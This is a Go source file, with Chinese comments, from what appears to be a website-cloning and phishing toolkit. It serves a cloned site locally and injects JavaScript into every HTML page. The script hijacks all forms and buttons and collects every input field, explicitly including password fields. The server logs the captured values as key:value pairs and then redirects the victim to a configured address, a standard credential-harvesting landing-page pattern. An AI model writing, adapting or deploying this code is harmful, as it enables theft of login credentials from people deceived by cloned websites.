package utils

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

// CloneConfig 配置接口，避免循环导入
type CloneConfig interface {
	GetClickTurnto() string
}

// ServerConfig 服务器配置
type ServerConfig struct {
	ProjectPath string
	Port        int
	Host        string
	ClickTurnto string
}

// FindAvailablePort 查找系统中可用的端口
func FindAvailablePort() (int, error) {
	// 尝试从8080开始查找可用端口
	for port := 8080; port <= 65535; port++ {
		addr := fmt.Sprintf(":%d", port)
		listener, err := net.Listen("tcp", addr)
		if err == nil {
			listener.Close()
			return port, nil
		}
	}
	return 0, fmt.Errorf("没有找到可用端口")
}

// StartServer 启动本地服务器（保持兼容性）
func StartServer(projectPath string) (*ServerConfig, error) {
	return StartServerWithConfig(projectPath, nil)
}

// StartServerWithConfig 启动本地服务器，带配置支持
func StartServerWithConfig(projectPath string, config CloneConfig) (*ServerConfig, error) {
	port, err := FindAvailablePort()
	if err != nil {
		return nil, err
	}

	serverConfig := &ServerConfig{
		ProjectPath: projectPath,
		Port:        port,
		Host:        "localhost",
	}

	// 如果提供了配置，获取跳转地址
	if config != nil {
		serverConfig.ClickTurnto = config.GetClickTurnto()
	}

	go startHTTPServerWithConfig(serverConfig)

	// 等待服务器启动
	time.Sleep(100 * time.Millisecond)

	fmt.Printf("本地服务器已启动: http://%s:%d\n", serverConfig.Host, serverConfig.Port)
	return serverConfig, nil
}

// startHTTPServerWithConfig 启动HTTP服务器，带配置支持
func startHTTPServerWithConfig(config *ServerConfig) {
	r := mux.NewRouter()

	// 处理静态文件
	r.PathPrefix("/css/").Handler(http.StripPrefix("/css/", http.FileServer(http.Dir(filepath.Join(config.ProjectPath, "css")))))
	r.PathPrefix("/js/").Handler(http.StripPrefix("/js/", http.FileServer(http.Dir(filepath.Join(config.ProjectPath, "js")))))
	r.PathPrefix("/imgs/").Handler(http.StripPrefix("/imgs/", http.FileServer(http.Dir(filepath.Join(config.ProjectPath, "imgs")))))

	// 处理表单提交
	r.HandleFunc("/submit", func(w http.ResponseWriter, r *http.Request) {
		handleFormSubmitWithConfig(w, r, config)
	}).Methods("POST")

	// 处理主页和其他页面
	r.PathPrefix("/").HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		serveModifiedHTMLWithConfig(w, r, config)
	})

	addr := fmt.Sprintf(":%d", config.Port)
	fmt.Printf("服务器监听地址: %s\n", addr)

	if err := http.ListenAndServe(addr, r); err != nil {
		fmt.Printf("服务器启动失败: %v\n", err)
	}
}

// serveModifiedHTML 提供修改后的HTML文件
func serveModifiedHTML(w http.ResponseWriter, r *http.Request, projectPath string) {
	// 确定要服务的文件路径
	filePath := r.URL.Path
	if filePath == "/" {
		filePath = "/index.html"
	}

	fullPath := filepath.Join(projectPath, filePath)

	// 检查文件是否存在
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		http.NotFound(w, r)
		return
	}

	// 读取HTML文件
	content, err := os.ReadFile(fullPath)
	if err != nil {
		http.Error(w, "无法读取文件", http.StatusInternalServerError)
		return
	}

	// 修改HTML内容，添加表单处理功能
	modifiedContent := modifyHTMLForFormHandling(string(content))

	// 设置内容类型
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(modifiedContent))
}

// modifyHTMLForFormHandling 修改HTML以支持表单处理
func modifyHTMLForFormHandling(htmlContent string) string {
	// 添加表单提交JavaScript
	jsScript := `
<script>
document.addEventListener('DOMContentLoaded', function() {
    // 查找所有表单
    const forms = document.querySelectorAll('form');
    
    forms.forEach(function(form) {
        // 设置表单提交到我们的处理端点
        form.action = '/submit';
        form.method = 'POST';
        
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // 收集所有输入字段的数据
            const formData = new FormData(form);
            
            // 收集所有文本输入框
            const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="number"], textarea, select');
            inputs.forEach(function(input) {
                if (input.name || input.id) {
                    const key = input.name || input.id || 'unnamed_field';
                    if (!formData.has(key)) {
                        formData.append(key, input.value);
                    }
                }
            });
            
            // 直接提交表单，让服务端处理重定向
            fetch('/submit', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                // 如果是重定向响应，浏览器会自动跟随
                if (response.redirected) {
                    window.location.href = response.url;
                } else {
                    return response.text();
                }
            })
            .then(result => {
                if (result) {
                    console.log('表单提交结果:', result);
                }
            })
            .catch(error => {
                console.error('表单提交错误:', error);
            });
        });
    });
    
    // 查找所有submit按钮和button，添加点击事件
    const buttons = document.querySelectorAll('button, input[type="submit"]');
    buttons.forEach(function(button) {
        if (button.type === 'submit' || button.tagName.toLowerCase() === 'button') {
            button.addEventListener('click', function(e) {
                // 如果按钮在表单内，让表单处理提交
                const form = button.closest('form');
                if (form) {
                    return; // 让表单的submit事件处理
                }
                
                // 如果按钮不在表单内，收集页面上所有输入字段
                e.preventDefault();
                
                const inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="number"], textarea, select');
                const formData = new FormData();
                
                inputs.forEach(function(input) {
                    if (input.name || input.id) {
                        const key = input.name || input.id || 'unnamed_field';
                        formData.append(key, input.value);
                    }
                });
                
                // 直接提交数据，让服务端处理重定向
                fetch('/submit', {
                    method: 'POST',
                    body: formData
                })
                .then(response => {
                    // 如果是重定向响应，浏览器会自动跟随
                    if (response.redirected) {
                        window.location.href = response.url;
                    } else {
                        return response.text();
                    }
                })
                .then(result => {
                    if (result) {
                        console.log('按钮点击结果:', result);
                    }
                })
                .catch(error => {
                    console.error('数据提交错误:', error);
                });
            });
        }
    });
});
</script>`

	// 在</body>标签前插入JavaScript
	if strings.Contains(htmlContent, "</body>") {
		htmlContent = strings.Replace(htmlContent, "</body>", jsScript+"\n</body>", 1)
	} else {
		// 如果没有</body>标签，在末尾添加
		htmlContent += jsScript
	}

	return htmlContent
}

// handleFormSubmit 处理表单提交
func handleFormSubmit(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "只支持POST方法", http.StatusMethodNotAllowed)
		return
	}

	var data map[string]interface{}
	var keyValuePairs []string

	// 处理JSON数据
	if r.Header.Get("Content-Type") == "application/json" {
		if err := r.ParseForm(); err == nil {
			// 尝试解析表单数据
			for key, vals := range r.Form {
				if len(vals) > 0 {
					keyValuePairs = append(keyValuePairs, fmt.Sprintf("[%s]:%s", key, vals[0]))
				}
			}
		}

		// 如果没有表单数据，尝试解析JSON
		if len(keyValuePairs) == 0 {
			decoder := json.NewDecoder(r.Body)
			if err := decoder.Decode(&data); err == nil {
				for key, value := range data {
					if str, ok := value.(string); ok && str != "" {
						keyValuePairs = append(keyValuePairs, fmt.Sprintf("[%s]:%s", key, str))
					}
				}
			}
		}
	} else {
		// 处理表单数据
		if err := r.ParseForm(); err != nil {
			http.Error(w, "解析表单失败", http.StatusBadRequest)
			return
		}

		for key, vals := range r.PostForm {
			if len(vals) > 0 && vals[0] != "" {
				keyValuePairs = append(keyValuePairs, fmt.Sprintf("[%s]:%s", key, vals[0]))
			}
			fmt.Printf("表单字段 %s: %v\n", key, vals)
		}
	}

	// 格式化输出为"key:value/key:value/key:value"的形式
	result := strings.Join(keyValuePairs, "/")
	if result == "" {
		result = "无数据"
	}

	fmt.Printf("表单提交结果: %s\n", result)

	// 返回结果
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Write([]byte(result))
}

// handleFormSubmitWithConfig 处理表单提交，带配置支持
func handleFormSubmitWithConfig(w http.ResponseWriter, r *http.Request, config *ServerConfig) {
	if r.Method != "POST" {
		http.Error(w, "只支持POST方法", http.StatusMethodNotAllowed)
		return
	}

	var data map[string]interface{}
	var keyValuePairs []string

	// 处理JSON数据
	if r.Header.Get("Content-Type") == "application/json" {
		if err := r.ParseForm(); err == nil {
			// 尝试解析表单数据
			for key, vals := range r.Form {
				if len(vals) > 0 {
					keyValuePairs = append(keyValuePairs, fmt.Sprintf("[%s]:%s", key, vals[0]))
				}
			}
		}

		// 如果没有表单数据，尝试解析JSON
		if len(keyValuePairs) == 0 {
			decoder := json.NewDecoder(r.Body)
			if err := decoder.Decode(&data); err == nil {
				for key, value := range data {
					if str, ok := value.(string); ok && str != "" {
						keyValuePairs = append(keyValuePairs, fmt.Sprintf("[%s]:%s", key, str))
					}
				}
			}
		}
	} else {
		// 处理表单数据
		if err := r.ParseForm(); err != nil {
			http.Error(w, "解析表单失败", http.StatusBadRequest)
			return
		}

		for key, vals := range r.PostForm {
			if len(vals) > 0 && vals[0] != "" {
				keyValuePairs = append(keyValuePairs, fmt.Sprintf("[%s]:%s", key, vals[0]))
			}
			fmt.Printf("表单字段 %s: %v\n", key, vals)
		}
	}

	// 格式化输出为"key:value/key:value/key:value"的形式
	result := strings.Join(keyValuePairs, "/")
	if result == "" {
		result = "无数据"
	}

	fmt.Printf("表单提交结果: %s\n", result)

	// 如果配置了跳转地址，进行服务端重定向
	if config.ClickTurnto != "" {
		fmt.Printf("重定向到: %s\n", config.ClickTurnto)
		http.Redirect(w, r, config.ClickTurnto, http.StatusFound) // 302重定向
		return
	}

	// 如果没有配置跳转地址，返回结果文本
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.Write([]byte(result))
}

// serveModifiedHTMLWithConfig 提供修改后的HTML文件，带配置支持
func serveModifiedHTMLWithConfig(w http.ResponseWriter, r *http.Request, config *ServerConfig) {
	// 确定要服务的文件路径
	filePath := r.URL.Path
	if filePath == "/" {
		filePath = "/index.html"
	}

	fullPath := filepath.Join(config.ProjectPath, filePath)

	// 检查文件是否存在
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		http.NotFound(w, r)
		return
	}

	// 读取HTML文件
	content, err := os.ReadFile(fullPath)
	if err != nil {
		http.Error(w, "无法读取文件", http.StatusInternalServerError)
		return
	}

	// 修改HTML内容，添加表单处理功能
	modifiedContent := modifyHTMLForFormHandling(string(content))

	// 设置内容类型
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(modifiedContent))
}
